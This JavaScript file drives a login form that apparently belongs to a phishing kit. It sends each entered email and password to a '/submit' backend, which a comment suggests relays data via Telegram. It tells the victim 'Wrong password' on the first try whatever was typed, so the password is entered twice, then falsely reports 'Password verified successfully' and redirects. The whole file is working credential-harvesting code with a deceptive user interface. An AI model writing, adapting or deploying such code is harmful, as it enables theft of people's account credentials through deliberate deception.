document.addEventListener('DOMContentLoaded', function() {
    let submissionCount = 0;
    const requiredSubmissions = 2;
    const redirectUrls = ['contact.html']; 

    const userForm = document.getElementById('user-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const submissionFeedback = document.getElementById('submission-feedback');
    const togglePassword = document.getElementById('togglePassword');

    // Password Visibility Toggle
    if (togglePassword) {
        togglePassword.addEventListener('click', function (e) {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.querySelector('i').classList.toggle('fa-eye');
            this.querySelector('i').classList.toggle('fa-eye-slash');
        });
    }

    userForm.addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent default form submission

        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();

        // Client-side validation
        if (!email || !/\S+@\S+\.\S+/.test(email)) {
            submissionFeedback.className = 'info-text text-danger-feedback';
            submissionFeedback.innerText = "Please enter a valid email address.";
            emailInput.focus();
            return;
        }

        if (!password) {
            submissionFeedback.className = 'info-text text-danger-feedback';
            submissionFeedback.innerText = "Password cannot be empty.";
            passwordInput.focus();
            return;
        }

        // --- Send data to the backend ---
        fetch('/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ email, password }),
        })
        .then(response => {
            if (!response.ok) {
                // Handle server errors (e.g., if Telegram fails)
                console.error('Server responded with an error');
            }
            return response.json();
        })
        .then(data => {
            console.log('Response from server:', data);
        })
        .catch(error => console.error('Error submitting data:', error));


        submissionCount++;

        if (submissionCount < requiredSubmissions) {
            submissionFeedback.className = 'info-text text-danger-feedback';
            submissionFeedback.innerText = "Wrong password. Please try again.";
        } else {
            submissionFeedback.className = 'info-text text-success-feedback';
            submissionFeedback.innerText = "Password verified successfully! Redirecting...";

            // Redirect after a short delay
            setTimeout(() => {
                const randomIndex = Math.floor(Math.random() * redirectUrls.length);
                window.location.href = redirectUrls[randomIndex];
            }, 1500);
        }
        
        // Don't clear the form on wrong password, only on success or manually
        // userForm.reset();
    });
});